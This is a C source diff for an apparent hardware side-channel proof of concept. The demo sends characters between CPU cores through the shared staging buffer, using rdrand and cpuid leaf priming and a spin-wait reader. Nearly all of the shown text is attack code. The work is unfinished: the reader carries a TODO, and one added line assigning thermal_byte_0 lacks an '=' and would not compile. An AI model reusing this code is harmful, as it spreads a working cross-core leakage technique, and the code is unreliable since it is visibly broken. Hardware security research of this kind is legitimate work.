@@ -10,8 +10,16 @@
 
 #define CYCLE_LENGTH 6000000
 
+// cpu_byte_0 = first byte of CPUID brand string 1
+// thermal_byte_0 = same byte in the staging buffer, but contains the value after executing cpuid with leaf 0x6
+uint8_t cpu_byte_0, thermal_byte_0;
+
 void attacker_write_char(int cpu){
     set_processor_affinity(cpu);
+    uint8_t *mem =
+            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
+                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
+    memset(mem, 0xFF, _page_size * 256);
 
     char* leak_candidate_string = sample_strings[rand() % sample_string_count];
     int leak_pos = 0;
@@ -24,22 +32,19 @@ void attacker_write_char(int cpu){
         uint64_t random_number;
         asm volatile("rdrand %0":"=r"(random_number):);
 
-        random_number = random_number & 0xF;
+        random_number = random_number & 0xFF;
 
         if ((char)random_number == leak_candidate_string[leak_pos]) {
-            asm volatile(
-            "mov $0x80000004, %%eax\n"
-            "cpuid\n"
-            "mfence\n"
-            :::"eax");
+            //I 'throw away' the return value on purpose to reuse code
+            prime_and_get_cpuid(CPUID_BRAND_STRING_1_PRIMITIVE);
 
-            //TODO: Wait for the reader to signal CPUID, then continuing
-            while (1) {}
+            while (!staging_buffer_byte_changed(mem, 0, cpu_byte_0)){}
         }
     }
 }
 
 void attacker_read_char(int cpu, int reps){
+    //TODO: Implement correct reader
     set_processor_affinity(cpu);
     uint8_t *mem =
             mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
@@ -54,7 +59,7 @@ void attacker_read_char(int cpu, int reps){
         "cpuid\n"
         "mfence\n"
         :::"eax");
-        while (!rdrand_section_changed(mem, byte_32)){}
+        while (!staging_buffer_byte_changed(mem, 32, byte_32)){}
         uint64_t random_number = 0;
         vector_read(mem, 20000, staging_buffer, 32, 40, 0);
         for(int i = 0; i < 8; i++) {
@@ -67,7 +72,6 @@ void attacker_read_char(int cpu, int reps){
     munmap(mem-1, _page_size * 257);
 }
 
-
 int main(int argc, char **args) {
     printf("Demo 3: Transmitting data across cores.\n\n");
     _page_size = getpagesize();
@@ -79,7 +83,8 @@ int main(int argc, char **args) {
     memset(mem, 0xFF, _page_size * 256);
     crosstalk_init(argc, args);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
-    byte_32 = get_byte_32();
+    cpu_byte_0 = prime_and_get_cpuid(CPUID_BRAND_STRING_1_PRIMITIVE);
+    thermal_byte_0 prime_and_get_cpuid(CPUID_THERMAL_STRING_PRIMITIVE);
     pid = fork();
     if (!pid) attacker_write_char(writer_cpu);
     attacker_read_char(reader_cpu, 50);
